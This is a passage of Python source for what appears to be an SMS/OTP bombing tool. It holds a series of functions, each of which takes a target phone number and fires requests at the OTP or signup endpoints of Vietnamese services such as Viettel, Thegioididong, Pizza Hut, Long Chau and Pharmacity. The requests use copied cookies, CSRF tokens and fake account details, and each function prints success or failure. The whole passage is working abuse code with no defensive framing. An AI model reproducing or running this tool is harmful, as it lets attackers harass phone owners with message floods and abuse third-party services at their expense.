        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "dkvt: THÀNH CÔNG!"))
    else:
        print(format_print("x", "dkvt: THẤT BẠI!"))   
        
        
def tgdd(sdt):
  headers = {
    'Host': 'www.thegioididong.com',
    # 'content-length': '234',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.thegioididong.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '__zi=2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvRNVG5cGSfJejD0FN9vzs--st0XPc38sDm.1; DMX_Personal=%7B%22UID%22%3A%22d167dd8fe0888a9e18467ce3c9bbba62d2bb78bf%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvLsMZE2gr68ezYw7kGvwkvKYd-mibgnbv67W_nnDSPH6VjDEd0DDrlO0X2SnwvKm-sj7HOwHCLNAo7Cab_JTlAeL9kN3c--nZ-R5jSYHTX8O-Xvi-sxNjDwZk-6PpM7a_4; SvID=beline2686|ZPPIG|ZPPIE',
    }
  data = {
    'phoneNumber': sdt,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKmEuGLjG73Nu3OcrziLWklJso95JQREBpSricRSiqNboVDzkobizZ8BC1MYLuRHBg0MFyAI4296BdzGcULqSvabfm1n-kajaC3BTIGmM2yamwUAzHMBo56K9VcLGn9G68',
    }
  try:
    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    headers=headers,
    data=data,
  )
    if response.status_code == 200:
        print(format_print("*", "tgdd: THÀNH CÔNG!"))
    else:
        print(format_print("x", "tgdd: THẤT BẠI!"))   
  except:
    pass
    
    
def kiot(phone):
    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': '0972936627',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "0338607465",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        headers=headers,
        data=data,
    )
    if response.status_code == 200:
        print(format_print("*", "kiot: THÀNH CÔNG!"))
    else:
        print(format_print("x", "kiot: THẤT BẠI!"))   
        
        
def moneydonglo(phone):
    Headers = {"Host": "api.moneydong.vip","content-length": "72","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://h5.moneydong.vip","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://h5.moneydong.vip/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Payload = {"phone": phone[1:11], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
    response = requests.post("https://api.moneydong.vip/h5/LoginMessage_ultimate", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "moneydonglo: THÀNH CÔNG!"))
    else:
        print(format_print("x", "moneydonglo: THẤT BẠI!"))   
        
        
def pizzahut(sdt):
    headers = {
        "Host": "pizzahut.vn",
        "Content-Length": "91",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Origin": "https://pizzahut.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://pizzahut.vn/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "x_polaris_sd=98vLElKu62K7WNZoG06W1nsexHNKEFnfAsoJ|T5b6wSq7Trlg9g8n/c4z|gvAgcmzDnvm7JMKJFFkFr0vYtTayscI/8HhifBDClmz/odXi8MRDqfL1scd2cfpzMcqXi3BV!!"
    }

    data = {
        "keyData": "appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone=" + sdt
    }

    response = requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest", 
                             headers=headers, 
                             data=json.dumps(data))
    if response.status_code == 200:
        print(format_print("*", "pizzahut: THÀNH CÔNG!"))
    else:
        print(format_print("x", "pizzahut: THẤT BẠI!"))   
        
                                 
def nhathuocankhang(sdt):
  headers = {
    'Host': 'www.nhathuocankhang.com',
    # 'content-length': '234',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.nhathuocankhang.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8LmKQPt7rjZHu0V-bNFwwHscz2yLoq586I4Lb6Y-ToneavtDGfBdQlKM96IgG4HaumzWSqj5GsWN8tR1EsPCkJZgGtiQHKXQymmuYUb87PZarZwffTDDb-GOuD_kf4jXVxeD1Sd1a2-vQtvavytg9q4; MWG_PRODUCT_BASIC_DB=4FuwGHlvbgdNE8CVofFa9v_s2%2Fs0vi7N3%2FJ62lEnOmwUZc2_tr48NA--; MWG_CART_SS_10=CfDJ8GnUTmoe3%2BpChgdP7xs5VKaFREdm1yQy5M1cdz1hHSGw2%2BslHVMtUrpWgBri%2F3qUK2xCZVtKTl7FphamMWAKleAgbg8LQ6ZFddoX6%2FH8%2BMVZuhXKpDl2WLrIAx1sBTaYCus2nlDgkz23FkOqSpwEd6c%2FNg6vK9yAjGXJKkPMqJEe; ASP.NET_SessionId=bwrkgz11hnnxtewbdjfeex4e; .AspNetCore.Antiforgery.q5r70a3YBCY=CfDJ8GnUTmoe3-pChgdP7xs5VKb9YSfLXxvJ3lXKRWJSt-AQXv5YtFjeWR0Z75DTCg1lQndAcJLLv8f7gWfYm5hVXsVNRYCAomikneWF6ane57SmJw1P1AHlWmEQnU-Yr1umFq_szbeljVJcC70r91TrtnI; _pk_id.2.b94a=a6a89cf2389e78df.1693703302.; _pk_ses.2.b94a=1; SvID=ak211|ZPPcj|ZPPce; .AspNetCore.Antiforgery.4PZsHduyjpg=CfDJ8Btx1b7t0ERJkQbRPSImfvK5FLtxro4F9WhnGJrTApIxRQf7vF78hMKF7K2znIRjvsez8YA-rK8g-g7WPUjWGXuxkTvo2r_XJX_ldw7fzsMHaycfgqM9fJXJhLGkAn52uO32AgkSlUkk4RB9inaNNrw',
    }
  data = {
    'phoneNumber': sdt,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIkx_XgfKyE4czujvNxaAfv-MMWo9wOPHefqEtwPEVHDRuyl_T_wvv5Z_4xwdsEMumCuozvudOcuN1pdJS4qccI79A292sfeOBWlV4Pn-ULzeEAddY2V3Jl_1HXnntsKtA',
  }
  try:
    response = requests.post(
    'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    headers=headers,
    data=data,
  )
    if response.status_code == 200:
        print(format_print("*", "nhathuocankhang: THÀNH CÔNG!"))
    else:
        print(format_print("x", "nhathuocankhang: THẤT BẠI!"))   
  except:
    pass
    
    
def nhathuoclongchau(sdt):
  headers = {
    'Host': 'api.nhathuoclongchau.com.vn',
    # 'content-length': '60',
    'access-control-allow-origin': '*',
    'accept': 'application/json, text/plain, */*',
    'order-channel': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-channel': 'EStore',
    'content-type': 'application/json',
    'origin': 'https://nhathuoclongchau.com.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://nhathuoclongchau.com.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phoneNumber":"%s","otpType":0,"fromSys":"WEBKHLC"}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "nhathuoclongchau: THÀNH CÔNG!"))
  else:
      print(format_print("x", "nhathuoclongchau: THẤT BẠI!"))   
        
        
def riviu(sdt):
  headers = {
    'Host': 'production-account.riviu.co',
    # 'content-length': '44',
    'device_id': '2895593903',
    'language': 'vi',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'region_uuid': '112f7e2e9da240be937daa66b1c4d1ce',
    'accept': 'application/json, text/plain, */*',
    'platform': 'web',
    'app_version': '3.1.6',
    'origin': 'https://riviu.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://riviu.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"country_prefix":"84","phone":"%s"}' %sdt #replace("sdt",sdt)
  try:
    response = requests.post('https://production-account.riviu.co/v1.0/check/phone', headers=headers, data=data)
    if response.status_code == 200:
        print(format_print("*", "riviu: THÀNH CÔNG!"))
    else:
        print(format_print("x", "riviu: THẤT BẠI!"))   
  except:
    pass
    
    
def phuclong(sdt):
  headers = {
    'Host': 'api-crownx.winmart.vn',
    # 'content-length': '97',
    'accept': 'application/json',
    'authorization': 'Bearer undefined',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://order.phuclong.com.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"phoneNumber":"%s","fullName":"Lo Cac","email":"KAka@gmail.com","password":"12345cc@@@"}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "phuclong: THÀNH CÔNG!"))
  else:
      print(format_print("x", "phuclong: THẤT BẠI!"))   
        
        
def ICANKID(sdt):
  headers = {
    'Host': 'id.icankid.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '134',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://id.icankid.vn',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://id.icankid.vn/auth',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_fbp=fb.1.1693704584997.1439624676; _hjSessionUser_3154488=eyJpZCI6IjNkNDg4YmVjLWE2MmUtNWM4ZS04NGE5LWU0MzVmY2UxNGI3YiIsImNyZWF0ZWQiOjE2OTM3MDQ1ODU0MDUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3154488=0; _hjSession_3154488=eyJpZCI6IjU0MjUwNTRkLTdjZGYtNDc2Mi05YTNiLTNkZWEwZDI1MjExYSIsImNyZWF0ZWQiOjE2OTM3MDQ1ODU0MTgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1',
}
  data = '{"phone":"%s","challenge_code":"7020a94b1bb3973b1f44e1c5ef9dfaf4b997e4886ecfd33fc176836a157260eb","challenge_method":"SHA256"}' %sdt #replace("sdt",sdt)
  response = requests.post('https://id.icankid.vn/api/otp/challenge/', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "ICANKID: THÀNH CÔNG!"))
  else:
      print(format_print("x", "ICANKID: THẤT BẠI!"))   
        
        
def medigoapp(sdt):
  headers = {
    'Host': 'production-api.medigoapp.com',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'origin': 'https://www.medigoapp.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.medigoapp.com/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  params = {
    'phone': '+84' + sdt[1:],
}
  response = requests.get('https://production-api.medigoapp.com/login/v2/flow', params=params, headers=headers)
  if response.status_code == 200:
      print(format_print("*", "medigoapp: THÀNH CÔNG!"))
  else:
      print(format_print("x", "medigoapp: THẤT BẠI!"))   
        
        
def ecogreen(sdt):
  headers = {
    'Host': 'ecogreen.com.vn',
    # 'content-length': '22',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://ecogreen.com.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://ecogreen.com.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'auth.strategy=local',
}
  data = '{"phone":"%s"}' %sdt #replace("sdt",sdt)
  response = requests.post('https://ecogreen.com.vn/api/auth/register/send-otp', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "ecogreen: THÀNH CÔNG!"))
  else:
      print(format_print("x", "ecogreen: THẤT BẠI!"))   
        
        
def rrvay(sdt):
  headers = {
    'Host': 'api.rrvay.com',
    # 'content-length': '683',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'text/plain;charset=UTF-8',
    'accept': '*/*',
    'origin': 'https://h5.rrvay.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.rrvay.com/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":"20230903094918rjmxmirinydw76lc4ieb37sk4qvglj2o15f3759f5abe4ce5ac4193706e033170ae91001b0063470b68ac979438ea2db0md9lazrze1zb0i7zjn4l4n3leysyscq41","termSysVersion":"8.1.0","termModel":"CPH1803","brand":"OPPO","termId":"","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":null,"lat":null},"bizType":"202","appName":"Alo Credit","packageName":"com.rrvay.h5","screenResolution":"720,1520"},"clientTypeFlag":"h5","token":"","phoneNumber":"%s","timestamp":"1693705774265","bizParams":{"phoneNum":"0338607282","code":null,"type":200,"channelCode":"H1h82"},"sign":"532b0dcd6b2edfa91886cbdade889842"}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api.rrvay.com/app/member/sendSmsCode', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "rrvay: THÀNH CÔNG!"))
  else:
      print(format_print("x", "rrvay: THẤT BẠI!"))   
        
        
def pharmacity(sdt):
  headers = {
    'Host': 'api-gateway.pharmacity.vn',
    # 'content-length': '36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://www.pharmacity.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.pharmacity.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"phone":"%s","referral":""}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "pharmacity: THÀNH CÔNG!"))
  else:
      print(format_print("x", "pharmacity: THẤT BẠI!"))   
      
      
def ghn(sdt):
  headers = {
    'Host': 'online-gateway.ghn.vn',
    # 'content-length': '40',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://sso.ghn.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"phone":"%s","type":"register"}' %sdt #replace("sdt",sdt)
  response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "ghn: THÀNH CÔNG!"))
  else:
      print(format_print("x", "ghn: THẤT BẠI!"))   
      
      
def beecow(sdt):
  headers = {
    'Host': 'api.beecow.com',
    # 'content-length': '136',
    'content-type': 'application/json; text/plain',
    'accept': 'application/json, text/plain, application/stream+json',
    'ati': '2403440711961',
    'platform': 'WEB',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'time-zone': 'Asia/Saigon',
    'origin': 'https://admin.gosell.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://admin.gosell.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"password":"12345cc@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"%s"}}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api.beecow.com/api/register/gosell', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "beecow: THÀNH CÔNG!"))
  else:
      print(format_print("x", "beecow: THẤT BẠI!"))   
      
      
def thepizzacompany(sdt):
  headers = {
    'Host': 'thepizzacompany.vn',
    # 'content-length': '353',
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1',
    'origin': 'https://thepizzacompany.vn',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://thepizzacompany.vn/register?returnUrl=%2Fpizza',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
